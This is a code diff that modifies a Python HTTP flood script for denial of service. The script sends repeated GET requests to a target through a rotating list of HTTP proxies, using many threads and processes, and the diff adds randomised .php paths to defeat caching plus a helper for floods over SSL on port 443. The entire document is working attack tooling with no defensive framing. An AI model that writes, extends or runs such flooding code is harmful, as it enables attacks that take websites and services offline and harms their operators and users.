@@ -9,13 +9,19 @@ import time
 import socks
 import datetime
 
+Choice = random.choice
+Intn = random.randint
+
 ip = ""
 port = 80
 period = 10
-path = ""
 num_sent = 0
+rpath = False
+a_z = [
+    "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
+]
 out_file = "proxy.txt"
-
+path = "/"+Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + ".php"
 for n,args in enumerate(sys.argv):
     if args=="-i":
         ip = str(sys.argv[n+1])
@@ -23,9 +29,8 @@ for n,args in enumerate(sys.argv):
         port = int(sys.argv[n+1])
     if args=="-path":
         path = str(sys.argv[n+1])
-
-Choice = random.choice
-Intn = random.randint
+    if args=="-rpath":
+        rpath = True
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -91,68 +96,47 @@ def rqheader():
     header =  connection + useragent + accept + referer + "\r\n"
     return header
 
+proxies = open(out_file).readlines()
+
+def port443(x,request):
+    try:
+        for i in range(100):
+            sent = x.send(str.encode(request))
+            if not sent:
+                proxy = Choice(proxies).strip().split(":")
+                break
+        x.close()
+    except:
+        for i in range(100):
+            sent = x.send(str.encode(request))
+            if not sent:
+                proxy = Choice(proxies).strip().split(":")
+                break
+        x.close()
+
 def attack():
+    global path
     global num_sent
     header = rqheader()
-    proxies = open(out_file).readlines()
     proxy = Choice(proxies).strip().split(":")
     go.wait()
     while True:
+        if rpath == True:
+            path = "/"+Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + ".php"
         get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
         request = get_host + header
         s = socks.socksocket()
         s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
         s.connect((ip, port))
         num_sent = num_sent + 1
-        print("[+]", num_sent, " Sent ", proxy, " => ", ip , ":", port)
-        try:
-            if port == 443:
-                x = ssl.wrap_socket(s)
-                try:
-                    for i in range (100):
-                        x.send(str.encode(request))
-                except:
-                    for i in range (100):
-                        x.send(str.encode(request))
-                    try:
-                        for i in range (100):
-                            x.send(str.encode(request))
-                    except:
-                        for i in range (100):
-                            x.send(str.encode(request))
-                        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-        except:
-            for i in range (300):
-                x.send(str.encode(request))
-            try:
-                get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
-                request = get_host + header
-                s = socks.socksocket()
-                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-                s.connect((ip, port))
-                num_sent = num_sent + 1
-                print("[+]", num_sent, " Sent ", proxy, " => ", ip , ":", port)
-                if port == 443:
-                    x = ssl.wrap_socket(s)
-                    try:
-                        for i in range (100):
-                            x.send(str.encode(request))
-                    except:
-                        for i in range (100):
-                            x.send(str.encode(request))
-                        try:
-                            for i in range (100):
-                                x.send(str.encode(request))
-                        except:
-                            for i in range (100):
-                                x.send(str.encode(request))
-            except:
-                for i in range (100):
-                    x.send(str.encode(request))
-                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+        print("[+]", num_sent, " Sent ", proxy, " => ", ip , ":", port , path)
+        if port == 443:
+            x = ssl.wrap_socket(s)
+            port443(x,request)
+
 
 def build_thread():
-	for _ in range(600):
+	for _ in range(300):
 		bth = threading.Thread(target=attack)
 		bth.start()
 
@@ -164,5 +148,5 @@ def build_process(process_num):
 		th.start()
 
 go = threading.Event()
-build_process(100)
+build_process(15)
 time.sleep(period)
